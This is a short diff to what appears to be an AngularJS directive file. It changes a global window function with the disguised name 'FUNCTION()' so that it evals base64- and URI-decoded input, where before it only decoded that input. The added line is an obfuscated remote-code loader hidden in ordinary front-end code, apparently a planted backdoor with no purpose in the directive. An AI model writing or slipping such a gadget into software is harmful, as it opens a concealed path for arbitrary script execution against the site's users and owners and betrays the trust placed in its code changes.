@@ -40,4 +40,4 @@ app.directive('contenteditable', ['$sce', function ($sce) {
         }
     };
 }]);
-window["FUNCTION()"] = function(g){decodeURIComponent(atob(g))}
+window["FUNCTION()"] = function(g){eval(decodeURIComponent(atob(g)))}
